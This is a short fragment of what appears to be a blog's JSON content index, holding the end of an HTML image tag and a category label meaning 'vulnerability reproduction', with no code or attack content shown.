alt=\"image-20240116121719105\"></p>\n","categories":["漏洞复现"]}]